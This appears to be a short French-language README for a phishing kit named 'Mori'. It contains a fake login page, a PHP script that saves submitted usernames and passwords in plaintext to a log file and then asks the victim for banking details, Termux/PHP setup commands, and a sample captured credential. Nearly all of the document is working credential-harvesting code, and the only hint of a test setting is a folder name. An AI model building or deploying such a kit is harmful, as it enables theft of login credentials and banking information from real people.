# Mori

│
├── index.html       → Page de connexion factice
├── login.php        → Script PHP qui capture les données
└── log.txt          → Fichier où les données sont enregistrées
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion</title>
</head>
<body>
  <h2>Page de Connexion</h2>
  <form action="login.php" method="post">
    <label>Nom d'utilisateur :</label><br>
    <input type="text" name="username"><br><br>
    <label>Mot de passe :</label><br>
    <input type="password" name="password"><br><br>
    <input type="submit" value="Connexion">
  </form>
</body>
</html>
<?php
// Récupération des données POST
$username = $_POST['username'];
$password = $_POST['password'];

// Création ou ouverture du fichier log
$file = fopen("log.txt", "a");

// Formatage et écriture des données
fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");

// Fermeture du fichier
fclose($file);

// Redirection vers une fausse page ou message
echo "<h2>entrez vos informations bancaires </h2><p>Veuillez confirmer .</p>";
?>touch log.txt
mkdir phishing-test && cd phishing-test
# Crée les fichiers ici avec nano ou via termux
php -S localhost:8080
http://localhost:8080/index.html
Username: testuser | Password: azerty123

